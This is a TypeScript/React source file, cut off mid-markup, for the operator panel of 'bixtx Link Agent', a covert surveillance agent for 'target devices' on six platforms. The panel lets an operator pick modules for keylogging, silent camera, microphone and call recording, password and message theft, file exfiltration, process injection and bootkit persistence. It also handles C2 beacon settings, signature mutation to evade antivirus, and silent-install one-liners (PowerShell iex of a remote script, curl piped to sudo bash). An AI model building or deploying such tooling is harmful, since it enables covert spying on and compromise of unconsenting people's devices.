import { useState, useEffect, useRef } from "react";
import {
  Server, Terminal, Check, Download,
  RefreshCw, Upload, Shield, Zap, HardDrive, Cpu,
  Activity, Lock, Signal, Wifi as WifiIcon, Link, Copy, ExternalLink,
} from "lucide-react";
import { OS, OS_COLOR, OS_ICON, OS_LABEL, DeployLinkPanel } from "../shared";

const API_BASE = window.location.hostname === "localhost"
  ? "http://localhost:3000/v1"
  : "https://bixtx.onrender.com/v1";

// Backend URL without /v1 — used for direct file downloads (no auth required)
const BACKEND_BASE = window.location.hostname === "localhost"
  ? "http://localhost:3000"
  : "https://bixtx.onrender.com";

// ── Per-platform link returned by POST /v1/devices/enroll ─────────────────
type PlatformLink = {
  platform:       string;
  linkId:         string;
  enrollKey:      string;
  enrollUrl:      string;
  downloadUrl:    string;
  installCommand: string;
  expiresAt:      string;
};
type EnrollData = { links: PlatformLink[]; expiresAt: string; label: string };

const PLAT_META: Record<string, { icon: string; color: string; label: string }> = {
  linux:   { icon: "🐧", color: "#f97316", label: "Linux"      },
  macos:   { icon: "🍎", color: "#a3a3a3", label: "macOS"      },
  windows: { icon: "🪟", color: "#3b82f6", label: "Windows"    },
  android: { icon: "🤖", color: "#10b981", label: "Android"    },
  ios:     { icon: "",  color: "#6b7280", label: "iOS"         },
  harmony: { icon: "⚡", color: "#a855f7", label: "HarmonyOS"  },
};

export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"error"|"info") => void }) {
  const [tab, setTab] = useState<"builder"|"deploy"|"fleet"|"capabilities"|"mutations">("builder");

  const [targetOS, setTargetOS] = useState<OS>("windows");
  const [c2Endpoint, setC2Endpoint] = useState("wss://bixtx.onrender.com/agent");
  const [beaconInterval, setBeaconInterval] = useState("30");

  const [modules, setModules] = useState<Record<string, boolean>>({
    keylogger: true, screenshot: true, camera: true, microphone: true,
    clipboard: true, geoLocation: true, wifiProbe: true, networkScan: false,
    processMonitor: true, fileExfil: false, callRecorder: true,
    socialMedia: true, browserHistory: true, contactsExfil: false, aiLearning: true,
    imsiCapture: false, voicePrint: true, facialRecog: true, torTunnel: false,
    airgapExfil: false, processInject: false, bootkit: false,
  });

  type FleetAgent = { id: string; device: string; os: OS; ip: string; version: string; status: string; lastPing: string; dataQueue: string; mutations: number };
  const [FLEET, setFLEET] = useState<FleetAgent[]>([]);
  const [fleetLoading, setFleetLoading] = useState(false);

  useEffect(() => {
    const token = sessionStorage.getItem("token");
    if (!token) return;
    setFleetLoading(true);
    fetch(`${API_BASE}/devices`, { headers: { Authorization: `Bearer ${token}` } })
      .then(r => r.ok ? r.json() : Promise.reject())
      .then(data => {
        const raw: { id:string; name:string; os?:string; platform?:string; ip?:string; version?:string; status?:string; lastSeen?:string|number; dataQueueMB?:number; mutationCount?:number }[] = data.devices ?? data ?? [];
        setFLEET(raw.map(d => ({
          id:        d.id,
          device:    d.name,
          os:        (d.os ?? d.platform ?? "windows") as OS,
          ip:        d.ip ?? "—",
          version:   d.version ?? "—",
          status:    d.status === "online" ? "active" : d.status === "warning" ? "warning" : "offline",
          lastPing:  d.lastSeen ? (() => { const s = Math.round((Date.now() - Number(d.lastSeen)) / 1000); return s < 10 ? "Now" : s < 60 ? `${s}s ago` : s < 3600 ? `${Math.round(s/60)}m ago` : `${Math.round(s/3600)}h ago`; })() : "—",
          dataQueue: d.dataQueueMB != null ? `${d.dataQueueMB.toFixed(1)} MB` : "0 B",
          mutations: d.mutationCount ?? 0,
        })));
      })
      .catch(() => {})
      .finally(() => setFleetLoading(false));
  }, []);

  const [enrollData, setEnrollData] = useState<EnrollData | null>(null);
  const [enrollLoading, setEnrollLoading] = useState(false);
  const [enrollLabel, setEnrollLabel] = useState("");
  const [deploying, setDeploying] = useState(false);
  const [deployTarget, setDeployTarget] = useState("");

  // ── Android APK build state ──────────────────────────────────────────────
  type BuildStatus = { status: "idle"|"triggered"|"building"|"done"|"error"; message: string; downloadUrl?: string };
  const [apkBuild, setApkBuild] = useState<BuildStatus>({ status: "idle", message: "" });
  // useRef avoids stale-closure problems with timer IDs
  const apkPollRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Cleanup timer on unmount
  useEffect(() => () => { if (apkPollRef.current) clearTimeout(apkPollRef.current); }, []);

  const pollApkStatus = (token: string) => {
    fetch(`${API_BASE}/build/android/status`, {
      headers: { Authorization: `Bearer ${token}` },
    })
      .then(r => r.ok ? r.json() : Promise.reject())
      .then(d => {
        // Use top-level status field (added to api.js)
        const topStatus: string = d.status ?? "";
        const run = d.latestRun;

        const isComplete =
          topStatus === "completed" ||
          (run?.status === "completed" && run?.conclusion === "success");

        const isFailed =
          topStatus === "failed" ||
          (run?.status === "completed" && run?.conclusion && run.conclusion !== "success");

        if (isComplete) {
          const dlUrl = d.downloadUrl || `${BACKEND_BASE}/v1/download/android`;
          setApkBuild({ status: "done", message: "APK ready — click to download", downloadUrl: dlUrl });
          show("Android APK build complete!", "success");
          apkPollRef.current = null;
        } else if (isFailed) {
          const conclusion = run?.conclusion || "error";
          setApkBuild({ status: "error", message: `Build failed: ${conclusion}. Check GitHub Actions.` });
          apkPollRef.current = null;
        } else {
          const updatedAt = run?.updatedAt ? ` (${new Date(run.updatedAt).toLocaleTimeString()})` : "";
          const phase = topStatus || run?.status || "queued";
          setApkBuild({ status: "building", message: `Build ${phase}…${updatedAt}` });
          // Poll every 5 seconds while in progress
          apkPollRef.current = setTimeout(() => pollApkStatus(token), 5_000);
        }
      })
      .catch(() => {
        // Retry on network error
        apkPollRef.current = setTimeout(() => pollApkStatus(token), 10_000);
      });
  };

  const handleBuildApk = async () => {
    const token = sessionStorage.getItem("token");
    if (!token) { show("Not authenticated", "error"); return; }
    setApkBuild({ status: "triggered", message: "Triggering CI build…" });
    if (apkPollRef.current) { clearTimeout(apkPollRef.current); apkPollRef.current = null; }
    try {
      const r = await fetch(`${API_BASE}/build/android`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ c2WsUrl: c2Endpoint, beaconInterval: parseInt(beaconInterval) }),
      });
      const d = await r.json();
      if (d.localBuild) {
        setApkBuild({ status: "error", message: d.command || "Build locally with ./gradlew assembleRelease" });
        show("CI not configured — see build command below", "info");
        return;
      }
      if (!r.ok) throw new Error(d.error || "Build trigger failed");
      show("Build triggered — polling for status every 5s…", "info");
      setApkBuild({ status: "building", message: "Queued in GitHub Actions…" });
      // Give GH ~20s to start the runner before first poll
      apkPollRef.current = setTimeout(() => pollApkStatus(token), 20_000);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : "Unknown error";
      setApkBuild({ status: "error", message: msg });
      show("Build trigger failed", "error");
    }
  };

  // Download the APK — uses direct URL (no auth required on /download/android)
  const handleDownloadApk = () => {
    const url = apkBuild.downloadUrl || `${BACKEND_BASE}/v1/download/android`;
    const a = document.createElement("a");
    a.href = url;
    a.download = "bixtx-agent.apk";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    show("APK download started — check your Downloads folder", "success");
  };

  const handleGenerateLink = async () => {
    const token = sessionStorage.getItem("token");
    if (!token) { show("Not authenticated", "error"); return; }
    setEnrollLoading(true);
    setEnrollData(null);
    try {
      const r = await fetch(`${API_BASE}/devices/enroll`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ label: enrollLabel || "agent", ttl: "24h" }),
      });
      if (!r.ok) throw new Error("Server error");
      const data = await r.json();
      if (!Array.isArray(data.links)) throw new Error("Server returned unexpected format — redeploy the backend");
      setEnrollData(data as EnrollData);
      show("6 platform-specific links generated — expires in 24h", "success");
    } catch {
      show("Failed to generate links — check server connection", "error");
    } finally {
      setEnrollLoading(false);
    }
  };

  const handleDeploy = async () => {
    const token = sessionStorage.getItem("token");
    if (!token) { show("Not authenticated", "error"); return; }
    const targets = deployTarget ? [deployTarget] : FLEET.filter(a => a.status === "active").map(a => a.id);
    if (!targets.length) { show("No online devices to deploy to", "error"); return; }
    setDeploying(true);
    try {
      const jobId = `job-${Date.now()}`;
      const r = await fetch(`${API_BASE}/deploy/job`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ jobId, type: "update", version: "4.7.2", deviceIds: targets }),
      });
      if (!r.ok) throw new Error("Server error");
      const d = await r.json();
      show(`Deploy job ${jobId} dispatched to ${d.dispatched}/${d.total} device(s)`, "success");
    } catch {
      show("Deploy failed — check server connection", "error");
    } finally {
      setDeploying(false);
    }
  };

  const handleMutate = () => {
    setMutating(true);
    setMutProgress(0);
    let cur = 0;
    const iv = setInterval(() => {
      cur = Math.min(100, cur + 3);
      setMutProgress(cur);
      if (cur >= 100) {
        clearInterval(iv);
        setMutating(false);
        setMutLog((prev: { ts:string; event:string; target:string; result:string }[]) => [{
          ts: new Date().toISOString().replace("T"," ").slice(0,16),
          event: "Global signature rotation + hash randomisation",
          target: "All active agents",
          result: "OK",
        }, ...prev]);
        show("Mutation pushed to all active agents", "success");
      }
    }, 80);
  };

  const [mutating, setMutating] = useState(false);
  const [mutProgress, setMutProgress] = useState(0);
  const [mutLog, setMutLog] = useState<{ ts:string; event:string; target:string; result:string }[]>([]);

  const [avScanResult, setAvScanResult] = useState<null | { engine: string; detected: boolean }[]>(null);
  const [avScanning, setAvScanning] = useState(false);

  const MODULE_DEFS: { key: string; label: string; category: string; risk: "low"|"medium"|"high"|"critical"; desc: string }[] = [
    { key:"keylogger",     label:"Keylogger",           category:"Input",     risk:"high",     desc:"Captures all keystrokes in real-time" },
    { key:"screenshot",    label:"Screen Capture",      category:"Visual",    risk:"medium",   desc:"Periodic & triggered screenshots" },
    { key:"camera",        label:"Camera Recording",    category:"Visual",    risk:"critical", desc:"Silent front/rear camera capture" },
    { key:"microphone",    label:"Microphone",          category:"Audio",     risk:"critical", desc:"Ambient audio recording" },
    { key:"clipboard",     label:"Clipboard Monitor",   category:"Input",     risk:"medium",   desc:"Intercepts copy/paste content" },
    { key:"geoLocation",   label:"GPS / Location",      category:"Location",  risk:"medium",   desc:"Real-time GPS and cell tower triangulation" },
    { key:"wifiProbe",     label:"WiFi Probe",          category:"Network",   risk:"medium",   desc:"Scans nearby networks & probe history" },
    { key:"networkScan",   label:"LAN Scanner",         category:"Network",   risk:"high",     desc:"Maps all devices on local network" },
    { key:"processMonitor",label:"Process Monitor",     category:"System",    risk:"low",      desc:"Running processes, memory usage" },
    { key:"fileExfil",     label:"File Exfiltration",   category:"System",    risk:"critical", desc:"Silent upload of targeted files" },
    { key:"callRecorder",  label:"Call Recorder",       category:"Audio",     risk:"critical", desc:"Records voice calls (VoIP + cellular)" },
    { key:"socialMedia",   label:"Social Intercept",    category:"Comms",     risk:"high",     desc:"Reads messages from 9 platforms" },
    { key:"browserHistory",label:"Browser History",     category:"Comms",     risk:"medium",   desc:"URLs, logins, saved passwords" },
    { key:"contactsExfil", label:"Contacts / Calendar", category:"Comms",     risk:"high",     desc:"Address book and calendar events" },
    { key:"aiLearning",    label:"AI Behavioral Learn", category:"AI",        risk:"medium",   desc:"Builds target behavioral profile" },
    { key:"imsiCapture",   label:"IMSI Capture",        category:"Network",   risk:"critical", desc:"Intercepts IMSI / cellular identity" },
    { key:"voicePrint",    label:"Voice Fingerprint",   category:"Audio",     risk:"high",     desc:"Identifies speakers by voice biometrics" },
    { key:"facialRecog",   label:"Facial Recognition",  category:"Visual",    risk:"critical", desc:"Identifies faces in camera frames" },
    { key:"torTunnel",     label:"Tor C2 Tunnel",       category:"Network",   risk:"high",     desc:"Routes C2 traffic through Tor network" },
    { key:"airgapExfil",   label:"Air-Gap Bridge",      category:"Network",   risk:"critical", desc:"Exfil via ultrasonic/RF on isolated nets" },
    { key:"processInject", label:"Process Injection",   category:"System",    risk:"critical", desc:"Injects into trusted processes" },
    { key:"bootkit",       label:"Bootkit Persistence", category:"System",    risk:"critical", desc:"Pre-boot persistence, survives reinstalls" },
  ];

  const RISK_COLOR: Record<string, string> = { low:"#10b981", medium:"#f59e0b", high:"#ef4444", critical:"#3b82f6" };

  const handleAVScan = () => {
    setAvScanning(true);
    setAvScanResult(null);
    setTimeout(() => {
      setAvScanning(false);
      setAvScanResult([
        { engine:"Windows Defender",  detected:false },
        { engine:"Kaspersky",         detected:false },
        { engine:"Malwarebytes",      detected:false },
        { engine:"CrowdStrike Falcon",detected:false },
        { engine:"SentinelOne",       detected:false },
        { engine:"Carbon Black",      detected:false },
        { engine:"ESET NOD32",        detected:false },
        { engine:"Bitdefender",       detected:false },
        { engine:"Sophos",            detected:true  },
        { engine:"McAfee",            detected:false },
        { engine:"Avast",             detected:false },
        { engine:"Trend Micro",       detected:false },
      ]);
    }, 3500);
  };

  const SUB_TABS: { id: typeof tab; label: string; icon: string }[] = [
    { id:"builder",      label:"Agent Builder",  icon:"🔨" },
    { id:"deploy",       label:"Deployment",     icon:"🚀" },
    { id:"fleet",        label:"Agent Fleet",    icon:"📡" },
    { id:"capabilities", label:"Capabilities",   icon:"⚙️" },
    { id:"mutations",    label:"AI Mutations",   icon:"🧬" },
  ];

  const activeCount = FLEET.filter(a => a.status === "active").length;
  const totalDataMB = FLEET.reduce((s: number, a: FleetAgent) => s + (parseFloat(a.dataQueue) || 0), 0);
  const totalData = totalDataMB > 0 ? `${totalDataMB.toFixed(1)} MB` : "0 B";

  return (
    <div className="max-w-7xl mx-auto px-6 py-8">
      <div className="flex flex-wrap items-start justify-between gap-4 mb-6">
        <div className="flex items-center gap-4">
          <div className="w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0"
            style={{ background: "linear-gradient(135deg,#3b82f6,#10d9a0)", boxShadow:"0 0 24px rgba(59,130,246,0.4)" }}>
            <Server size={22} color="#fff" />
          </div>
          <div>
            <h1 className="text-2xl font-black" style={{ color:"#e2eaf6" }}>
              Software A — <span style={{ color:"#3b82f6" }}>Link Agent</span>
            </h1>
            <p className="text-sm" style={{ color:"#6b8ab0" }}>
              Ultra-lightweight silent monitoring agent · Installed on target devices · &lt;15 MB
            </p>
          </div>
        </div>
        <div className="flex flex-wrap gap-3">
          {[
            { label:"Active Agents",   val: `${activeCount} / ${FLEET.length || "—"}`, color:"#10b981" },
            { label:"Data Queued",     val: totalData,                                  color:"#10d9a0" },
            { label:"Agent Version",   val: "v4.7.2",                                   color:"#3b82f6" },
            { label:"Node.js Runtime", val: "18 LTS",                                   color:"#f59e0b" },
          ].map(s => (
            <div key={s.label} className="px-4 py-2 rounded-xl text-center"
              style={{ background:`${s.color}12`, border:`1px solid ${s.color}30` }}>
              <div className="text-base font-black" style={{ color:s.color }}>{s.val}</div>
              <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{s.label}</div>
            </div>
          ))}
        </div>
      </div>

      <div className="flex gap-1 mb-6 p-1 rounded-xl w-fit flex-wrap" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
        {SUB_TABS.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)}
            className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all"
            style={{ background: tab===t.id ? "linear-gradient(135deg,#2563eb,#3b82f6)" : "transparent", color: tab===t.id ? "#fff" : "#6b8ab0" }}>
            <span>{t.icon}</span>{t.label}
          </button>
        ))}
      </div>

      {/* BUILDER TAB */}
      {tab === "builder" && (
        <div className="space-y-5">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
            {/* ── Left sidebar ── */}
            <div className="lg:col-span-1 space-y-4">
              {/* Platform selector (visual only — all 6 platforms get links) */}
              <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Target Platform</div>
                <div className="grid grid-cols-3 gap-2">
                  {(["windows","macos","linux","android","ios","harmony"] as OS[]).map(id => (
                    <button key={id} onClick={() => setTargetOS(id)}
                      className="flex flex-col items-center gap-1 p-2.5 rounded-xl border transition-all"
                      style={{ background: targetOS===id ? `${OS_COLOR[id]}18` : "#030b16", borderColor: targetOS===id ? OS_COLOR[id] : "rgba(59,130,246,0.15)" }}>
                      <span className="text-xl">{OS_ICON[id]}</span>
                      <span className="text-[9px] font-mono font-bold" style={{ color: targetOS===id ? OS_COLOR[id] : "#6b8ab0" }}>{OS_LABEL[id].split(" ")[0].toUpperCase()}</span>
                    </button>
                  ))}
                </div>
                <div className="text-[9px] font-mono mt-2" style={{ color:"#3a4a60" }}>
                  All 6 platforms receive their own unique link when you generate
                </div>
              </div>

              {/* C2 config */}
              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Agent Configuration</div>
                <div>
                  <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>C2 WebSocket URL</div>
                  <input value={c2Endpoint} onChange={e => setC2Endpoint(e.target.value)}
                    placeholder="wss://your-server:3001"
                    className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                    style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#10d9a0" }} />
                  <div className="text-[10px] mt-1" style={{ color:"#4a6080" }}>Written into .env at setup time</div>
                </div>
                <div>
                  <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>Beacon Interval (seconds)</div>
                  <input value={beaconInterval} onChange={e => setBeaconInterval(e.target.value)}
                    type="number" min="5" max="3600"
                    className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                    style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#10d9a0" }} />
                </div>
                <div>
                  <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>Device Label (optional)</div>
                  <input value={enrollLabel} onChange={e => setEnrollLabel(e.target.value)}
                    placeholder="agent"
                    className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                    style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#e2eaf6" }} />
                </div>
              </div>

              {/* Generate links for all 6 platforms */}
              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.3)" }}>
                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Generate Install Links</div>
                <div className="text-[10px]" style={{ color:"#4a6080" }}>
                  Creates 6 independent links — each platform gets its own unique URL and key
                </div>
                <button onClick={handleGenerateLink} disabled={enrollLoading}
                  className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
                  style={{ background:"linear-gradient(135deg,#2563eb,#10d9a0)", color:"#fff" }}>
                  {enrollLoading
                    ? <><RefreshCw size={14} className="animate-spin" />Generating 6 links…</>
                    : <><Link size={14} />Generate All Platform Links</>}
                </button>
                {enrollData && (
                  <div className="rounded-lg px-3 py-2 text-xs font-mono"
                    style={{ background:"#030b16", border:"1px solid rgba(16,185,129,0.3)", color:"#10b981" }}>
                    ✓ 6 platform links ready — see cards below ↓
                  </div>
                )}
              </div>

              {/* Deploy to devices */}
              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Deploy to Device</div>
                <select value={deployTarget} onChange={e => setDeployTarget(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg text-xs outline-none"
                  style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#b8cce8" }}>
                  <option value="">All online devices ({FLEET.filter(a=>a.status==="active").length})</option>
                  {FLEET.filter(a => a.status==="active").map(a => (
                    <option key={a.id} value={a.id}>{a.device} — {a.ip}</option>
                  ))}
                </select>
                <button onClick={handleDeploy} disabled={deploying}
                  className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
                  style={{ background: deploying ? "rgba(59,130,246,0.2)" : "rgba(59,130,246,0.15)", border:"1px solid rgba(59,130,246,0.4)", color:"#3b82f6" }}>
                  {deploying ? <><RefreshCw size={14} className="animate-spin" />Deploying...</> : <><Upload size={14} />Push Deploy Job</>}
                </button>
                <div className="text-[10px] font-mono" style={{ color:"#4a6080" }}>
                  Sends DEPLOY_JOB to online agents via WebSocket
                </div>
              </div>
            </div>

            {/* ── Right main area ── */}
            <div className="lg:col-span-2 space-y-4">
              {/* Android APK builder */}
              <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0d1f12", border:"1px solid rgba(16,185,129,0.4)" }}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className="text-lg">🤖</span>
                    <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#10b981" }}>Android APK — One-Click Build</div>
                  </div>
                  <div className="text-[9px] font-mono px-2 py-0.5 rounded-full"
                    style={{ background:"rgba(16,185,129,0.15)", color:"#10b981", border:"1px solid rgba(16,185,129,0.3)" }}>
                    Real Native App
                  </div>
                </div>
                <div className="text-[10px]" style={{ color:"#6b8ab0" }}>
                  Builds a signed Kotlin APK via GitHub Actions CI. C2 URL and beacon interval are baked into the build.
                  Installs silently — no app store, sideload via the enrollment link.
                </div>
                <div className="grid grid-cols-2 gap-2">
                  <button onClick={handleBuildApk}
                    disabled={apkBuild.status === "triggered" || apkBuild.status === "building"}
                    className="flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
                    style={{
                      background: apkBuild.status === "done"
                        ? "rgba(16,185,129,0.15)"
                        : "linear-gradient(135deg,#16a34a,#10b981)",
                      color:"#fff",
                      border: apkBuild.status === "done" ? "1px solid rgba(16,185,129,0.4)" : "none",
                    }}>
                    {apkBuild.status === "triggered" || apkBuild.status === "building"
                      ? <><RefreshCw size={14} className="animate-spin" />Building…</>
                      : apkBuild.status === "done"
                      ? <><Check size={14} />Build complete ✓</>
                      : <><Zap size={14} />Build APK</>}
                  </button>

                  {/* Download APK — active once build is done, uses direct URL (no auth needed) */}
                  <button
                    onClick={handleDownloadApk}
                    disabled={apkBuild.status !== "done"}
                    className="flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all"
                    style={{
                      background: apkBuild.status === "done"
                        ? "linear-gradient(135deg,#16a34a,#10b981)"
                        : "rgba(16,185,129,0.1)",
                      border: apkBuild.status === "done"
                        ? "none"
                        : "1px solid rgba(16,185,129,0.3)",
                      color: apkBuild.status === "done" ? "#fff" : "#6b8ab0",
                      opacity: apkBuild.status === "done" ? 1 : 0.4,
                    }}>
                    <Download size={14} />
                    {apkBuild.status === "building" ? "Building…" : "Download APK"}
                  </button>
                </div>

                {apkBuild.status !== "idle" && (
                  <div className="rounded-lg px-3 py-2 text-[10px] font-mono" style={{
                    background:"#030b16",
                    border:`1px solid ${
                      apkBuild.status === "done" ? "rgba(16,185,129,0.4)"
                      : apkBuild.status === "error" ? "rgba(239,68,68,0.4)"
                      : "rgba(59,130,246,0.3)"
                    }`,
                    color: apkBuild.status === "done" ? "#10b981" : apkBuild.status === "error" ? "#ef4444" : "#6b8ab0",
                  }}>
                    {apkBuild.status === "building" && <RefreshCw size={10} className="animate-spin inline mr-1.5" />}
                    {apkBuild.message || "—"}
                  </div>
                )}
                <div className="text-[9px] font-mono" style={{ color:"#2a3a50" }}>
                  Polls status every 5s · Requires: GITHUB_TOKEN + GITHUB_REPO env vars on server
                </div>
              </div>

              {/* Setup instructions for selected platform */}
              <div className="rounded-2xl overflow-hidden" style={{ background:"#050410", border:"1px solid rgba(59,130,246,0.22)" }}>
                <div className="px-4 py-2.5 flex items-center gap-2 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
                  <Terminal size={13} color="#3b82f6" />
                  <span className="text-xs font-mono" style={{ color:"#6b8ab0" }}>Setup Instructions — {OS_LABEL[targetOS]}</span>
                </div>
                <div className="p-4 min-h-48 font-mono text-xs space-y-1.5 overflow-y-auto max-h-72">
                  {targetOS === "android" ? (<>
                    <div style={{ color:"#10b981" }}># bixtx Android Agent — Kotlin native APK</div>
                    <div style={{ color:"#6b8ab0" }}># Option A: Build via CI (recommended)</div>
                    <div style={{ color:"#b8cce8" }}>1. Set GITHUB_TOKEN + GITHUB_REPO on your Render server</div>
                    <div style={{ color:"#b8cce8" }}>2. Click "Build APK" above</div>
                    <div style={{ color:"#b8cce8" }}>3. CI builds in ~3 min → click "Download APK" (auto-enabled)</div>
                    <div style={{ color:"#6b8ab0" }}># Option B: Build locally (requires Android SDK)</div>
                    <div style={{ color:"#b8cce8" }}>cd software-android</div>
                    <div style={{ color:"#b8cce8" }}>{`./gradlew assembleRelease -Pc2WsUrl="${c2Endpoint}" -PbeaconInterval=${beaconInterval}`}</div>
                    <div style={{ color:"#6b8ab0" }}># APK → app/build/outputs/apk/release/app-release.apk</div>
                    <div style={{ color:"#6b8ab0" }}># Sideload: adb install -r app-release.apk</div>
                  </>) : targetOS === "ios" ? (<>
                    <div style={{ color:"#3b82f6" }}># bixtx iOS Agent — Swift WebSocket C2</div>
                    <div style={{ color:"#6b8ab0" }}># Requirements: macOS + Xcode 15+ + Apple Developer account</div>
                    <div style={{ color:"#b8cce8" }}>open software-ios/Package.swift</div>
                    <div style={{ color:"#6b8ab0" }}># Set C2 endpoint in Sources/BixtxAgent/Config.swift:</div>
                    <div style={{ color:"#10d9a0" }}>{`C2_WS_URL = "${c2Endpoint}"`}</div>
                    <div style={{ color:"#10d9a0" }}>{`BEACON_INTERVAL = ${beaconInterval}`}</div>
                    <div style={{ color:"#6b8ab0" }}># Archive + distribute via Enterprise cert or TestFlight</div>
                    <div style={{ color:"#6b8ab0" }}># OR: generate a link (left panel) for MDM silent push</div>
                  </>) : targetOS === "harmony" ? (<>
                    <div style={{ color:"#f59e0b" }}># bixtx HarmonyOS Agent — ArkTS WebSocket C2</div>
                    <div style={{ color:"#6b8ab0" }}># Requirements: DevEco Studio 4.0+ + Huawei Developer account</div>
                    <div style={{ color:"#b8cce8" }}>deveco-studio software-harmony/</div>
                    <div style={{ color:"#6b8ab0" }}># Set C2 endpoint in entry/src/main/ets/agent/Config.ets:</div>
                    <div style={{ color:"#10d9a0" }}>{`C2_WS_URL: "${c2Endpoint}"`}</div>
                    <div style={{ color:"#10d9a0" }}>{`BEACON_INTERVAL: ${beaconInterval}`}</div>
                    <div style={{ color:"#6b8ab0" }}># Build HAP → sign → deploy via AGC enterprise channel</div>
                    <div style={{ color:"#6b8ab0" }}># OR: hdc app install bixtx-agent.hap  (direct sideload)</div>
                  </>) : targetOS === "windows" ? (<>
                    <div style={{ color:"#6b8ab0" }}># One-liner silent install (download + run concurrently):</div>
                    <div style={{ color:"#b8cce8" }}>{`powershell -ExecutionPolicy Bypass -c "& { $s=iwr 'https://bixtx.onrender.com/v1/agent/download/windows.ps1' -UseBasicParsing; iex $s.Content }"`}</div>
                    <div style={{ color:"#6b8ab0" }}># Manual: download windows.ps1 then run as Administrator</div>
                    <div style={{ color:"#b8cce8" }}>.\install.ps1 -EnrollKey BTX-WIN-XXXX -C2Url {c2Endpoint}</div>
                  </>) : (<>
                    <div style={{ color:"#6b8ab0" }}># One-liner silent install (downloads + installs concurrently):</div>
                    <div style={{ color:"#b8cce8" }}>{`curl -sSL 'https://bixtx.onrender.com/v1/agent/download/${targetOS === "macos" ? "macos" : "linux"}.sh' | sudo bash -s -- --key BTX-KEY --c2 ${c2Endpoint}`}</div>
                    <div style={{ color:"#10b981" }}># Installs as {targetOS === "macos" ? "launchd daemon" : "systemd service"} — runs silently in background</div>
                  </>)}
                </div>
              </div>

              {/* Agent specs */}
              <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
                <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Agent Specifications</div>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                  {[
                    { label:"Runtime",    val:"Node.js 18+",     icon:<Server size={13} />,    color:"#10b981" },
                    { label:"Protocol",   val:"WebSocket / WSS", icon:<WifiIcon size={13} />,  color:"#3b82f6" },
                    { label:"Encryption", val:"AES-256-GCM",     icon:<Lock size={13} />,      color:"#f59e0b" },
                    { label:"Beacon",     val:`${beaconInterval}s interval`, icon:<Signal size={13} />, color:"#10d9a0" },
                    { label:"CPU Impact", val:"<1% idle",        icon:<Activity size={13} />,  color:"#10b981" },
                    { label:"DB",         val:"SQLite encrypted", icon:<HardDrive size={13} />, color:"#a855f7" },
                    { label:"Platforms",  val:"6 OS supported",  icon:<Cpu size={13} />, color:"#3b82f6" },
                    { label:"Persistence",val:"systemd / launchd / Service", icon:<Shield size={13} />, color:"#10d9a0" },
                  ].map(s => (
                    <div key={s.label} className="rounded-lg p-3" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.12)" }}>
                      <div className="flex items-center gap-1.5 mb-1" style={{ color:s.color }}>{s.icon}
                        <span className="text-[10px] font-mono uppercase tracking-wide" style={{ color:"#6b8ab0" }}>{s.label}</span>
                      </div>
                      <div className="text-sm font-bold capitalize" style={{ color:s.color }}>{s.val}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>

          {/* ── 6-platform link cards (appear after Generate) ── */}
          {enrollData && Array.isArray(enrollData.links) && (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>
                  Platform Install Links — 6 unique keys — expires {new Date(enrollData.expiresAt).toLocaleString()}
                </div>
                <button onClick={handleGenerateLink} disabled={enrollLoading}
